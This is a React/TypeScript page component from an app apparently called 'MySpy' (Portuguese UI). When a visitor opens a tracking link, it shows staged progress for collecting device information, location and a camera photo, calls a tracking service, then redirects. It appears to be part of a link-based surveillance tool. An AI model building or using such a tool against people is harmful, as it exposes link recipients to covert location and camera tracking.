import React, { useEffect, useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';
import { trackAccess } from '../services/trackingService';
import AnimatedBackground from '../components/AnimatedBackground';

const Tracking: React.FC = () => {
  const { linkId } = useParams<{ linkId: string }>();
  const navigate = useNavigate();
  const [status, setStatus] = useState<string>('Iniciando rastreamento...');
  const [error, setError] = useState<string>('');
  const [progress, setProgress] = useState<number>(0);
  const [permissionWarnings, setPermissionWarnings] = useState<string[]>([]);

  useEffect(() => {
    const handleTracking = async () => {
      if (!linkId) {
        setError('Link inválido');
        return;
      }

      try {
        // Step 1: Collecting device info
        setStatus('Coletando informações do dispositivo...');
        setProgress(25);
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Step 2: Getting location
        setStatus('Obtendo localização...');
        setProgress(50);
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Step 3: Capturing photo
        setStatus('Capturando foto...');
        setProgress(75);
        await new Promise(resolve => setTimeout(resolve, 1000));

        // Step 4: Saving data
        setStatus('Salvando informações...');
        const result = await trackAccess(linkId);
        setProgress(100);
        
        // Handle permission warnings
        const warnings: string[] = [];
        if (result.errors?.location) {
          warnings.push('Localização não disponível - permissão negada');
        }
        if (result.errors?.photo) {
          warnings.push('Foto não disponível - permissão negada');
        }
        setPermissionWarnings(warnings);
        
        setStatus('Rastreamento concluído!');
        
        // Redirect after a short delay
        setTimeout(() => {
          navigate('/');
        }, 2000);
      } catch (error) {
        console.error('Error during tracking:', error);
        setError('Ocorreu um erro durante o rastreamento');
      }
    };

    handleTracking();
  }, [linkId, navigate]);

  return (
    <div className="min-h-screen text-white">
      <AnimatedBackground />
      
      <div className="container mx-auto px-4 py-8">
        <div className="max-w-md mx-auto bg-gray-900 bg-opacity-70 p-8 rounded-xl backdrop-blur-sm border border-indigo-900 mt-32">
          <div className="text-center">
            <h2 className="text-2xl font-bold mb-4">
              <span className="bg-clip-text text-transparent bg-gradient-to-r from-indigo-400 to-purple-300">
                MySpy
              </span>
            </h2>
            
            {error ? (
              <div className="bg-red-900 bg-opacity-30 border border-red-500 text-white rounded-lg p-3 text-sm">
                {error}
              </div>
            ) : (
              <div className="text-gray-300">
                <p className="mb-4">{status}</p>
                <div className="w-full bg-gray-700 rounded-full h-2.5 mb-4">
                  <div 
                    className="bg-indigo-400 h-2.5 rounded-full transition-all duration-500" 
                    style={{ width: `${progress}%` }}
                  ></div>
                </div>
                {permissionWarnings.length > 0 && (
                  <div className="mt-4 space-y-2">
                    {permissionWarnings.map((warning, index) => (
                      <div key={index} className="bg-yellow-900 bg-opacity-30 border border-yellow-500 text-yellow-200 rounded-lg p-2 text-sm">
                        {warning}
                      </div>
                    ))}
                  </div>
                )}
                <div className="flex justify-center mt-4">
                  <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-indigo-400"></div>
                </div>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default Tracking;